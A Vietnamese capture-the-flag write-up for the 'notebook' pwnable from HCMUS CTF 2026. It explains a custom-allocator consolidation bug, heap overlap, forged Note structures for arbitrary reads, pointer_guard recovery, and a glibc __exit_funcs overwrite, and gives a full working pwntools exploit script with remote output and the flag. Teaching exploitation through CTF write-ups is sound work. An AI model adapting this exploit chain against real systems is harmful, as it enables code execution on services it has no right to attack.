# notebook — HCMUS CTF 2026

**Category:** Pwnable  
**Tags:** `heap exploitation` · `custom allocator` · `arbitrary read` · `__exit_funcs` · `pointer mangling`

---

## 1. Mô tả bài

Binary là một ứng dụng quản lý ghi chú đơn giản, nhưng thay vì dùng `malloc`/`free` của glibc, tác giả tự viết hẳn một allocator riêng tên `Cage`. Đây là nơi bug ẩn náu.

Menu chính:

```
0:switch  1:write  2:read  3:erase  4:discard  5:tag  6:exit
```

Hai struct cốt lõi:

```cpp
typedef struct Note {
    uint64_t size;
    char    *data;
} Note;

typedef struct NoteBook {
    Note notes[48];   // sizeof = 48 * 0x10 = 0x300 byte
} NoteBook;
```

Có tối đa 16 quyển (`MAX_BOOKS = 16`), mỗi quyển 48 slot. `switch_book()` sẽ lazy-allocate notebook nếu index chưa tồn tại:

```cpp
if (!books[idx])
    books[idx] = (NoteBook *)cage.alloc(sizeof(NoteBook));
```

Điểm mấu chốt là `read note` cực kỳ đơn giản và mạnh:

```cpp
write(1, n->data, n->size);
```

Không có bound check, không có xác minh gì thêm — nếu ta kiểm soát được `n->data` và `n->size` thì đây là **arbitrary read** ngay lập tức.

Bài được biên dịch với đầy đủ mitigation: **PIE + Full RELRO + Canary + NX**. GOT không ghi được, stack không overflow được. Ta cần tìm một con đường khác.

---

## 2. Phân tích allocator Cage

Mỗi chunk có header 16 byte:

```cpp
typedef struct Block {
    uint64_t priv_size;   // size của chunk phía trước
    uint64_t curr_size;   // size của chunk hiện tại (bit 0 = prev_inuse flag)
    char     payload[];
} Block;
```

Các helper quan trọng:

```cpp
uint64_t SIZE(Block *b)  { return b->curr_size & ~0xfULL; }
uint64_t PSIZE(Block *b) { return b->priv_size & ~0xfULL; }
Block *next_blk(Block *b) { return (Block *)((uint64_t)b + SIZE(b)); }
Block *prev_blk(Block *b) { return (Block *)((uint64_t)b - PSIZE(b)); }
bool prev_inuse(Block *b) { return b->curr_size & 1; }
```

Thiết kế này rất giống ptmalloc — chunk biết kích thước của chunk đứng trước (thông qua `priv_size`), và bit thấp của `curr_size` đóng vai trò cờ `prev_inuse`. Khi một chunk được free, allocator có thể merge nó với các chunk free liền kề (consolidation).

---

## 3. Lỗ hổng — Bug trong `consolidate()`

Đây là toàn bộ hàm:

```cpp
Block *consolidate(Block *cur)
{
    Block *lo = cur, *hi = cur;
    uint64_t newsz   = SIZE(cur);
    uint64_t pred_sz = SIZE(cur);   // <--- BUG nằm ở đây

    while (!is_base(lo) && !prev_inuse(lo))
    {
        pop_bin(prev_blk(lo));
        lo = prev_blk(lo);
        newsz += SIZE(lo);
    }
    ...
    lo->curr_size           = newsz;
    next_blk(lo)->priv_size = pred_sz;   // <--- BUG nằm ở đây
```

Biến `pred_sz` được gán bằng `SIZE(cur)` ngay từ đầu và **không bao giờ được cập nhật** dù vòng lặp phía trên đã mở rộng `lo` về phía trước nhiều lần.

Sau khi merge xong, `next_blk(lo)->priv_size` bị ghi một giá trị sai — nó nhận `SIZE(cur)` ban đầu thay vì `newsz` (kích thước thực của chunk sau khi gộp).

### Kịch bản khai thác bug

Giả sử layout bộ nhớ như sau (tất cả chunk đều allocated):

```text
[ A  0x180 ][ B  0x180 ][ C  0x300 ][ D  0x100 ]
```

Chuỗi free:

1. `free(B)` → B vào bin
2. `free(A)` → A chạm B, consolidate thành `A+B` size `0x300`. Đúng ra `C->priv_size` phải được cập nhật thành `0x300`, nhưng bug khiến nó vẫn nhận `0x180` (= `SIZE(A)` lúc bắt đầu consolidate)
3. `free(C)` → allocator đọc `C->priv_size = 0x180`, tưởng chunk trước C chỉ là `B`. Nó merge ngược về `B` (thực ra là giữa chunk `A+B`) tạo thành free chunk `B+C` size `0x480`. Nhưng `A+B` vẫn còn trong bin!

Kết quả cuối cùng:

```text
Free chunk A+B  (size 0x300)  ─┐
                                ├── OVERLAP: vùng B chồng lấn
Free chunk B+C  (size 0x480)  ─┘
```

Đây là **heap overlap** — hai free chunk tồn tại song song và chồng lên nhau.

---

## 4. Từ overlap đến arbitrary read

### 4.1. Thiết lập overlap

Trên `book 0`, cấp phát 4 chunk theo đúng kích thước:

| Slot | Request size | Chunk size | Ký hiệu |
|------|-------------|-----------|---------|
| 0    | 0x170       | **0x180** | A       |
| 1    | 0x170       | **0x180** | B       |
| 2    | 0x2f0       | **0x300** | C       |
| 3    | 0xf0        | **0x100** | D (chặn top) |

Sau đó free theo thứ tự: `erase(1)` → `erase(0)` → `erase(2)`.

Lúc này bin có:
- Free chunk `A+B`, size `0x300`
- Free chunk `B+C`, size `0x480`

### 4.2. Đặt NoteBook lên vùng overlap

`switch(book 1)` sẽ allocate `sizeof(NoteBook) = 0x300` → chunk size `0x310`. Allocator chọn free chunk `B+C` size `0x480` (đủ lớn), split ra:

- `book 1` chiếm phần đầu `B+C`, kích thước `0x310`
- Phần dư `0x170` quay lại bin

`book 1` giờ bắt đầu tại địa chỉ `B`.

### 4.3. Lấy chunk writer chồng lên Book 1

Quay lại `book 0`, `write_note(slot 0, size 0x2f0)`. Allocator lấy free chunk `A+B` size `0x300`.

Payload note này bắt đầu tại địa chỉ `A + 0x10` (sau header) và kéo dài `0x2f0` byte. Notebook `book 1` bắt đầu tại `B + 0x10`.

Hình học:

```text
Địa chỉ  A+0x10   ← writer payload bắt đầu
                   ...
         A+0x180  ← B bắt đầu (= book 1 payload bắt đầu)
                   ← offset 0x180 trong writer payload
                   ...
         A+0x300  ← writer payload kết thúc
         A+0x490  ← book 1 payload kết thúc
```

Vùng giao nhau: `[A+0x180, A+0x300)` = **0x170 byte = 23 Note**.

Từ offset `0x180` trong writer payload, ta đang ghi trực tiếp lên `book 1->notes[0..22]`.

### 4.4. Forge fake Note để đọc tùy ý

Mỗi `Note` là 16 byte: `{uint64_t size, char* data}`. Nếu ghi:

```text
notes[0].size = 8
notes[0].data = target_addr
```

thì `read note 0` trên `book 1` sẽ gọi `write(1, target_addr, 8)`, leak 8 byte tại `target_addr`.

**Tăng throughput:** Dùng 10 group overlap độc lập, mỗi group cho 23 fake slot → tổng **230 probe mỗi vòng**, giúp scan remote không bị timeout.

---

## 5. Xây dựng chain exploit

Khi đã có arbitrary read, ta đi theo pipeline sau:

### Bước 1 — Scan và xác định stack mapping

Không có `/proc/self/maps`, nên phải probe từng page.

**Dấu hiệu page readable:** Forge fake note với `size = 1, data = candidate`. Nếu page readable, `write(1, ptr, 1)` trả về 1 byte. Nếu không readable, syscall fail với `EFAULT` và output chỉ có newline.

Script scan thô vùng `0x7ffc00000000..0x800000000000` (nơi stack user thường nằm) với stride `0x20000`. Khi tìm được hit đầu tiên, refine lại theo từng page trong cửa sổ `±64KB` để xác định chính xác dải page liên tiếp.

### Bước 2 — Lấy PIE base từ auxv

Dump toàn bộ stack mapping rồi parse `auxv`. Entry `AT_PHDR` (type = 3) chứa địa chỉ program header của binary trong memory:

```python
pie_base = AT_PHDR - elf.header.e_phoff
```

Verify bằng cách leak 4 byte đầu và check magic `\x7fELF`.

### Bước 3 — Leak libc base

Từ PIE base, leak `write@GOT` ra địa chỉ thực của `write` trong libc. Thay vì trừ offset cứng (dễ sai nếu remote dùng patch-level libc khác), scan ngược từng page cho đến khi gặp ELF header `\x7fELF` — đó chính là libc base. Cách này ổn định bất kể version.

### Bước 4 — Khôi phục pointer_guard

glibc mã hóa function pointer trong `__exit_funcs` theo công thức:

```text
mangled = rol(real_fn ^ pointer_guard, 17)
```

Để forge callback cần biết `pointer_guard`. Exploit đọc `__exit_funcs` rồi duyệt qua các entry trong initial list. Entry của chính binary dễ nhận ra vì `arg` hoặc `dso_handle` nằm trong vùng PIE. Function thật của entry đó là destructor của global `cage`:

```text
pointer_guard = ror(mangled, 17) ^ (pie + 0x4a6c)
```

*(Lưu ý: phải chọn đúng entry thuộc binary, không phải entry của `libstdc++`.)*

### Bước 5 — Ghi đè `__exit_funcs`

Đây là phần sáng tạo nhất. Ta không đụng tới stack hay return address — ta viết thẳng vào danh sách exit handler của glibc.

**Bố trí trong writer chunk:**

```text
writer + 0x20   ← fake exit_function_list
writer + 0x60   ← chuỗi "cat flag\x00"
writer + 0x100  ← fake chunk header
writer + 0x110  ← fake chunk payload
```

Fake exit list chứa một entry duy nhất:

```python
{
    flavor = 4,             # EFUNC_FN
    fn     = rol(system ^ pointer_guard, 17),
    arg    = cmd_str,       # địa chỉ chuỗi "cat flag"
    dso    = 0
}
```

**Cơ chế tạo chunk giả và split:**

Do ta cần ép allocator đặt một chunk remainder ngay tại `__exit_funcs - 0x10`, exploit dùng 2 giai đoạn:

1. **Stage 1:** Tạo fake chunk header "an toàn" (next chunk hợp lệ là filler chunk thật). Free fake chunk này qua cơ chế erase của `book 1`. Fake chunk vào bin của allocator.

2. **Stage 2:** Rewrite header của fake chunk thành kích thước rất lớn:
   ```text
   fake_final_size = (__exit_funcs - fake_hdr) + 0x180
   ```
   Allocate một note siêu lớn từ fake chunk → allocator split, remainder rơi tại `__exit_funcs - 0x10`. Allocate tiếp một note `0x170` → nhận payload tại đúng `__exit_funcs`. Ghi `p64(fake_list)` vào đó.

3. **Exit:** Gửi lệnh `6`. `main()` return, glibc chạy exit handler, đọc `fake_list`, gọi `system("cat flag")`.

Không cần ROP. Không cần shell interactive. Không cần smash canary.

---

## 6. Flow tổng thể

```
bug trong consolidate()
    priv_size của C bị ghi sai
    → free C tạo chunk B+C chồng lên A+B
    → 2 free chunk overlap

allocate book 1 từ B+C
allocate writer chunk từ A+B
    → writer[0x180..] chồng lên book1.notes[0..22]

forge Note metadata qua writer
    → arbitrary read (write(1, data, size))

scan stack (probe EFAULT vs readable)
    → stack mapping

dump stack → parse auxv AT_PHDR
    → PIE base

leak write@GOT → scan lùi ELF header
    → libc base

đọc __exit_funcs → tìm entry binary → unmangled dtor
    → pointer_guard

fake chunk → split → remainder tại __exit_funcs
ghi fake_list vào __exit_funcs

exit → system("cat flag") → FLAG
```

---

## 7. Exploit Script

```python
from pwn import *
import argparse
import math
import struct
import time

context.arch = "amd64"
context.log_level = "info"

elf = ELF("./prob", checksec=False)

HOST = "chall.blackpinker.com"
PORT = 20767

PROMPT = b"cmd > "
BAD_ADDR = 0x414141414141

NOTES_PER_BOOK   = 48
SLOTS_PER_GROUP  = 23
SCAN_GROUPS      = 10

STACK_SCAN_LO     = 0x7FFC00000000
STACK_SCAN_HI     = 0x800000000000
STACK_SCAN_STRIDE = 0x20000
STACK_REFINE_LO   = 0x40000
STACK_REFINE_HI   = 0x50000
PAGE              = 0x1000
LEAK_CHUNK        = 0x100

LIBC_WRITE_OFFSET      = 0x11C590
LIBC_SYSTEM_OFFSET     = 0x58750
LIBC_EXIT_FUNCS_OFFSET = 0x203680
LIBC_INIT_PTR_CHUNK    = 0x200

CAGE_DTOR_OFFSET     = 0x4A6C
REMAINDER_CHUNK_SIZE = 0x180

BOOKS_OFFSET     = elf.symbols["books"]
WRITE_GOT_OFFSET = elf.got["write"]


def p64s(*xs):
    return b"".join(p64(x) for x in xs)

def rol64(x, r):
    return ((x << r) | (x >> (64 - r))) & ((1 << 64) - 1)

def ror64(x, r):
    return ((x >> r) | ((x & ((1 << r) - 1)) << (64 - r))) & ((1 << 64) - 1)

def unpack_qword(data):
    return struct.unpack("<Q", data)[0]

def chunked(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i + n]


class Group:
    def __init__(self, group_id):
        self.group_id   = group_id
        self.book_idx   = group_id + 1
        self.base_slot  = group_id * 4
        self.writer_slot = self.base_slot
        self.guard_slot  = self.base_slot + 3


class Exploit:
    def __init__(self, io):
        self.io     = io
        self.groups = [Group(i) for i in range(SCAN_GROUPS)]
        self.prompt = PROMPT
        self.io.recvuntil(self.prompt)

    # ── Helpers giao tiếp ───────────────────────────────────────────────────

    def recv_n_prompts(self, count):
        data = b""
        while data.count(self.prompt) < count:
            chunk = self.io.recv(timeout=10)
            if not chunk:
                raise EOFError("connection closed while waiting for prompts")
            data += chunk
        return data

    def cmd(self, c):
        self.io.sendline(str(c).encode())

    def switch(self, idx):
        self.cmd(0)
        self.io.recvuntil(b"Book: ")
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(self.prompt)

    def write_note(self, slot, size, data, wait_prompt=True):
        self.cmd(1)
        self.io.recvuntil(b"slot: ")
        self.io.sendline(str(slot).encode())
        self.io.recvuntil(b"size: ")
        self.io.sendline(str(size).encode())
        self.io.recvuntil(b"data: ")
        self.io.send(data)
        if wait_prompt:
            self.io.recvuntil(self.prompt)

    def erase(self, slot):
        self.cmd(3)
        self.io.recvuntil(b"slot: ")
        self.io.sendline(str(slot).encode())
        self.io.recvuntil(self.prompt)

    def raw_erase_and_write(self, slot, size, payload):
        """Gộp erase + write_note thành một batch để giảm RTT."""
        self.io.send(
            b"3\n" + str(slot).encode() + b"\n"
            + b"1\n" + str(slot).encode() + b"\n"
            + str(size).encode() + b"\n"
        )
        self.io.recvuntil(b"data: ")
        self.io.send(payload)
        self.io.recvuntil(self.prompt)

    def read_raw(self, slot):
        self.cmd(2)
        self.io.recvuntil(b"slot: ")
        self.io.sendline(str(slot).encode())
        return self.io.recvuntil(self.prompt)

    def read_menu_batch(self, groups):
        """Gửi batch switch+read cho nhiều group, drain tất cả reply."""
        transcript = b""
        for group in groups:
            transcript += b"0\n" + str(group.book_idx).encode() + b"\n"
            for slot in range(SLOTS_PER_GROUP):
                transcript += b"2\n" + str(slot).encode() + b"\n"

        self.io.send(transcript)
        data = self.recv_n_prompts(len(groups) * (SLOTS_PER_GROUP + 1))
        parts = data.split(self.prompt)

        cursor = 0
        out = {}
        for group in groups:
            cursor += 1
            slot_out = []
            for _ in range(SLOTS_PER_GROUP):
                part = parts[cursor]; cursor += 1
                if b"slot: " in part:
                    part = part.split(b"slot: ", 1)[1]
                slot_out.append(part)
            out[group.group_id] = slot_out
        return out

    @staticmethod
    def parse_read_part(part):
        if not part.endswith(b"\n"):
            raise ValueError(f"unexpected read part: {part!r}")
        return part[:-1]

    # ── Dựng writer payload ─────────────────────────────────────────────────

    def writer_payload(self, pairs, prefix_patches=None):
        """
        Dựng 0x2f0-byte payload cho writer chunk.
        - Từ offset 0x180 trở đi: forge fake Note (size, ptr) chồng lên book N.
        - prefix_patches: [(offset, blob)] để ghi thêm vào đầu payload.
        """
        payload = bytearray(b"\x00" * 0x2F0)
        if prefix_patches:
            for off, blob in prefix_patches:
                payload[off:off + len(blob)] = blob

        pos = 0x180
        padded_pairs = list(pairs[:SLOTS_PER_GROUP])
        while len(padded_pairs) < SLOTS_PER_GROUP:
            padded_pairs.append((1, BAD_ADDR))

        for size, addr in padded_pairs:
            payload[pos:pos + 0x10] = p64s(size, addr)
            pos += 0x10
        return bytes(payload)

    # ── Khởi tạo overlap group ──────────────────────────────────────────────

    def setup_group(self, group):
        """
        Tạo một overlap group:
          book 0: slot A/B/C/D được alloc rồi free theo thứ tự tạo ra bug
          book N: được alloc nằm trên vùng B+C
          writer: alloc nằm trên vùng A+B, chồng lên notes[0..22] của book N
        """
        log.info("setup group %d -> book %d", group.group_id, group.book_idx)
        self.switch(0)
        self.write_note(group.base_slot + 0, 0x170, b"A")
        self.write_note(group.base_slot + 1, 0x170, b"B")
        self.write_note(group.base_slot + 2, 0x2F0, b"C")
        self.write_note(group.base_slot + 3, 0x0F0, b"D")
        self.erase(group.base_slot + 1)   # free B
        self.erase(group.base_slot + 0)   # free A → merge thành A+B, bug ghi sai priv_size của C
        self.erase(group.base_slot + 2)   # free C → tạo B+C chồng lên A+B
        self.switch(group.book_idx)        # book N alloc từ B+C
        self.switch(0)
        self.write_note(group.writer_slot, 0x2F0, self.writer_payload([]))  # writer alloc từ A+B

    def setup_scan_groups(self):
        for group in self.groups:
            self.setup_group(group)

    def reload_groups(self, group_to_pairs):
        """Cập nhật writer payload cho một tập group (erase + write)."""
        self.switch(0)
        for group in group_to_pairs:
            payload = self.writer_payload(group_to_pairs[group])
            self.raw_erase_and_write(group.writer_slot, 0x2F0, payload)

    # ── Arbitrary read ──────────────────────────────────────────────────────

    def leak_specs(self, specs, groups=None):
        """
        Đọc nhiều địa chỉ tùy ý. specs = [(size, addr), ...].
        Mỗi spec được map vào một fake Note trong một group.
        """
        if groups is None:
            groups = self.groups
        outputs = []
        cap = len(groups) * SLOTS_PER_GROUP

        for spec_batch in chunked(specs, cap):
            used_groups = groups[:math.ceil(len(spec_batch) / SLOTS_PER_GROUP)]
            mapping = {}
            idx = 0
            for group in used_groups:
                mapping[group] = spec_batch[idx:idx + SLOTS_PER_GROUP]
                idx += SLOTS_PER_GROUP

            self.reload_groups(mapping)
            batch_reads = self.read_menu_batch(used_groups)

            remaining = len(spec_batch)
            for group in used_groups:
                for slot in range(min(SLOTS_PER_GROUP, remaining)):
                    raw = self.parse_read_part(batch_reads[group.group_id][slot])
                    outputs.append(raw)
                remaining -= SLOTS_PER_GROUP
        return outputs

    def leak(self, addr, size, groups=None):
        specs = []
        off = 0
        while off < size:
            take = min(LEAK_CHUNK, size - off)
            specs.append((take, addr + off))
            off += take
        return b"".join(self.leak_specs(specs, groups=groups))

    def leak_qword(self, addr, groups=None):
        return unpack_qword(self.leak(addr, 8, groups=groups))

    # ── Scan stack ──────────────────────────────────────────────────────────

    def probe_readable(self, addrs):
        """
        Phân biệt page readable vs không readable:
        - readable: write(1, ptr, 1) trả về 1 byte → parse_read_part dài 1 byte
        - EFAULT:   chương trình chỉ in newline → parse_read_part dài 0 byte
        """
        specs = [(1, addr) for addr in addrs]
        raw = self.leak_specs(specs)
        return [len(x) == 1 for x in raw]

    def find_stack_anchor(self):
        """Scan coarse vùng stack với stride 0x20000."""
        cur = STACK_SCAN_HI - PAGE
        batch = 0
        started = time.time()

        while cur >= STACK_SCAN_LO:
            addrs = []
            for _ in range(len(self.groups) * SLOTS_PER_GROUP):
                if cur < STACK_SCAN_LO:
                    break
                addrs.append(cur)
                cur -= STACK_SCAN_STRIDE

            hits = self.probe_readable(addrs)
            for addr, ok in zip(addrs, hits):
                if ok:
                    log.success("stack anchor at %#x", addr)
                    return addr

            batch += 1
            if batch % 16 == 0:
                done = (STACK_SCAN_HI - PAGE) - cur
                total = STACK_SCAN_HI - STACK_SCAN_LO
                pct = 100.0 * done / total
                log.info("stack scan: %.2f%% (%#x left), elapsed %.1fs",
                         pct, cur, time.time() - started)

        raise RuntimeError("stack anchor not found")

    def refine_stack_mapping(self, anchor):
        """Refine theo từng page quanh anchor, lấy dải liên tiếp dài nhất."""
        lo = (anchor - STACK_REFINE_LO) & ~(PAGE - 1)
        hi = (anchor + STACK_REFINE_HI) & ~(PAGE - 1)
        pages = list(range(lo, hi, PAGE))
        readable = self.probe_readable(pages)
        hit_pages = [p for p, ok in zip(pages, readable) if ok]

        best, cur = [], []
        for page in hit_pages:
            if cur and page == cur[-1] + PAGE:
                cur.append(page)
            else:
                if len(cur) > len(best):
                    best = cur
                cur = [page]
        if len(cur) > len(best):
            best = cur

        start, end = best[0], best[-1] + PAGE
        log.success("stack mapping %#x - %#x", start, end)
        return start, end

    def dump_stack(self, stack_lo, stack_hi):
        specs = [(LEAK_CHUNK, addr)
                 for addr in range(stack_lo, stack_hi, LEAK_CHUNK)]
        return b"".join(self.leak_specs(specs))

    # ── Parse auxv → PIE ────────────────────────────────────────────────────

    def find_auxv_and_pie(self, stack_blob):
        """
        Tìm auxv trong stack dump, đọc AT_PHDR (type=3).
        PIE base = AT_PHDR - e_phoff
        """
        e_phoff = elf.header.e_phoff

        for off in range(0, len(stack_blob) - 0x80, 8):
            seen = {}
            pairs = []
            j = off
            while j + 0x10 <= len(stack_blob):
                typ = unpack_qword(stack_blob[j:j + 8])
                val = unpack_qword(stack_blob[j + 8:j + 0x10])
                pairs.append((typ, val))
                j += 0x10
                if typ == 0:
                    break
                if typ > 0x1000:
                    break
                seen[typ] = val

            if not pairs or pairs[-1][0] != 0 or 3 not in seen:
                continue

            pie = seen[3] - e_phoff
            if pie & 0xFFF:
                continue
            if self.leak(pie, 4, groups=[self.groups[0]]) != b"\x7fELF":
                continue

            log.success("PIE base %#x", pie)
            return pie, seen

        raise RuntimeError("failed to parse auxv / PIE")

    # ── Tìm libc base ───────────────────────────────────────────────────────

    def find_elf_base(self, any_ptr, groups=None, max_back=0x400000):
        """
        Scan ngược từng page từ any_ptr, tìm magic \\x7fELF.
        Ổn định hơn việc trừ offset cứng vì không phụ thuộc patch-level.
        """
        if groups is None:
            groups = [self.groups[0]]

        start = any_ptr & ~(PAGE - 1)
        pages = [start - off for off in range(0, max_back + PAGE, PAGE)]

        for batch in chunked(pages, len(groups) * SLOTS_PER_GROUP):
            specs = [(4, page) for page in batch]
            raws = self.leak_specs(specs, groups=groups)
            for page, raw in zip(batch, raws):
                if raw == b"\x7fELF":
                    return page
        raise RuntimeError(f"ELF base not found near {any_ptr:#x}")

    # ── Khôi phục pointer_guard ─────────────────────────────────────────────

    def recover_pointer_guard(self, pie, libc_base):
        """
        Đọc __exit_funcs, tìm entry thuộc binary (arg/dso trong PIE range).
        Với entry đó: pointer_guard = ror(mangled, 17) ^ (pie + CAGE_DTOR_OFFSET)
        """
        exit_funcs_ptr = self.leak_qword(
            libc_base + LIBC_EXIT_FUNCS_OFFSET, groups=[self.groups[0]])
        init_blob = self.leak(
            exit_funcs_ptr, LIBC_INIT_PTR_CHUNK, groups=[self.groups[0]])
        idx = unpack_qword(init_blob[8:16])

        for i in range(idx):
            base = 0x10 + i * 0x20
            if base + 0x20 > len(init_blob):
                break
            flavor, mangled, arg, dso = struct.unpack(
                "<QQQQ", init_blob[base:base + 0x20])
            if flavor != 4:
                continue
            if pie <= arg < pie + 0x20000 or pie <= dso < pie + 0x20000:
                guard = ror64(mangled, 17) ^ (pie + CAGE_DTOR_OFFSET)
                log.success("pointer_guard %#x", guard)
                return guard

        raise RuntimeError("failed to recover pointer_guard")

    # ── Ghi đè __exit_funcs ─────────────────────────────────────────────────

    def final_overwrite(self, pie, libc_base, pointer_guard):
        """
        Dựng fake exit_function_list trong writer chunk.
        Dùng fake chunk để ép allocator split tại __exit_funcs.
        Ghi con trỏ fake_list vào __exit_funcs.
        """
        book0  = self.leak_qword(pie + BOOKS_OFFSET, groups=[self.groups[0]])
        writer = self.leak_qword(book0 + 0x8,        groups=[self.groups[0]])
        log.info("book0 %#x", book0)
        log.info("writer %#x", writer)

        filler0      = 40
        filler1      = 41
        split_slot   = 42
        overwrite_slot = 43

        # Alloc 2 filler chunk thật để fake chunk có "next chunk" hợp lệ ở stage 1
        self.switch(0)
        self.write_note(filler0, 0x4000, b"E")
        self.write_note(filler1, 0x4000, b"F")

        filler1_ptr = self.leak_qword(
            book0 + filler1 * 0x10 + 0x8, groups=[self.groups[0]])

        fake_list = writer + 0x20
        cmd_str   = writer + 0x60
        fake_hdr  = writer + 0x100
        fake_pay  = fake_hdr + 0x10

        # Kích thước an toàn: fake chunk dừng trước filler1
        fake_safe_size = (filler1_ptr - 0x10) - fake_hdr
        if fake_safe_size < 0x4000:
            raise RuntimeError("fake chunk safe size too small")

        system = libc_base + LIBC_SYSTEM_OFFSET

        # Stage 1: ghi fake exit list, chuỗi lệnh, fake chunk header "an toàn"
        stage1_prefix = [
            # fake exit_function_list: next=0, idx=1, entry=(flavor=4, fn=mangled(system), arg, dso=0)
            (0x20, p64s(0, 1, 4, rol64(system ^ pointer_guard, 17), cmd_str, 0)),
            (0x60, b"cat flag\x00"),
            (0x100, p64s(0, fake_safe_size | 1)),
        ]
        # Forge note 0 của book 1 trỏ vào fake_pay để erase() free fake chunk
        stage1_pairs = [(8, fake_pay)]

        self.switch(0)
        self.raw_erase_and_write(
            self.groups[0].writer_slot, 0x2F0,
            self.writer_payload(stage1_pairs, stage1_prefix))

        # Free fake chunk: switch book 1 rồi erase slot 0
        self.switch(self.groups[0].book_idx)
        self.erase(0)

        # Stage 2: mở rộng fake chunk đến __exit_funcs
        split_size = (libc_base + LIBC_EXIT_FUNCS_OFFSET - 0x10) - fake_hdr
        fake_final_size = split_size + REMAINDER_CHUNK_SIZE

        stage2_prefix = [
            (0x20, p64s(0, 1, 4, rol64(system ^ pointer_guard, 17), cmd_str, 0)),
            (0x60, b"cat flag\x00"),
            (0x100, p64s(0, fake_final_size | 1)),
        ]
        self.switch(0)
        self.raw_erase_and_write(
            self.groups[0].writer_slot, 0x2F0,
            self.writer_payload([], stage2_prefix))

        # Alloc chunk rất lớn từ fake chunk → split, remainder tại __exit_funcs - 0x10
        huge_req = split_size - 0x10
        self.write_note(split_slot, huge_req, b"Z")

        # Alloc remainder → payload tại __exit_funcs, ghi con trỏ fake_list
        self.write_note(overwrite_slot, 0x170, p64(fake_list))
        log.success("__exit_funcs overwritten -> %#x", fake_list)

    # ── Entry point ─────────────────────────────────────────────────────────

    def solve(self):
        self.setup_scan_groups()

        anchor = self.find_stack_anchor()
        stack_lo, stack_hi = self.refine_stack_mapping(anchor)
        stack_blob = self.dump_stack(stack_lo, stack_hi)
        pie, _ = self.find_auxv_and_pie(stack_blob)

        write_addr = self.leak_qword(pie + WRITE_GOT_OFFSET, groups=[self.groups[0]])
        libc_base  = self.find_elf_base(write_addr, groups=[self.groups[0]])
        log.success("libc base %#x", libc_base)

        pointer_guard = self.recover_pointer_guard(pie, libc_base)
        self.final_overwrite(pie, libc_base, pointer_guard)

        self.cmd(6)
        return self.io.recvall(timeout=5)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    args = parser.parse_args()

    io = remote(args.host, args.port)
    exp = Exploit(io)
    out = exp.solve()
    if out:
        print(out.decode("utf-8", "ignore"))


if __name__ == "__main__":
    main()
```

---

## 8. Output khi chạy remote

```text
[*] setup group 0 -> book 1
...
[*] setup group 9 -> book 10
[+] stack anchor at 0x7fff9fdff000
[+] stack mapping 0x7fff9fdbf000 - 0x7fff9fe14000
[+] PIE base 0x59f65a783000
[+] libc base 0x760b7ee99000
[+] pointer_guard 0xfff19ebaa7520aaa
[*] book0 0xcf7046c0010
[*] writer 0xcf7046c0320
[+] __exit_funcs overwritten -> 0xcf7046c0340
HCMUS-CTF{w0w_1_m4d3_th15_ch4ll3ng3_1n_my_b1rthd4y}
```

---

## 9. Những điểm dễ sai

**Nhầm offset overlap.** Writer đè được đúng 23 Note, bắt đầu từ offset `0x180` trong payload. Sai 1 byte là fake Note bị lệch, `write(1, bad_ptr, size)` crash ngay.

**Trừ offset libc cứng.** Remote dùng patch-level khác local, nên `write_addr - libc.sym["write"]` có thể lệch vài byte. Scan ngược ELF header ổn định hơn nhiều.

**Lấy nhầm entry để khôi phục pointer_guard.** Nếu pick một entry thuộc `libstdc++` thay vì binary, XOR với `Cage::~Cage()` sẽ cho guard sai và stage cuối crash mà không có thông báo rõ ràng.

**Free fake chunk khi next chunk chưa hợp lệ.** Nếu bỏ qua stage 1 và dùng thẳng kích thước lớn, allocator đọc next chunk của fake chunk vào vùng rác và crash. Cần dùng filler chunk thật làm "neo" cho stage 1.
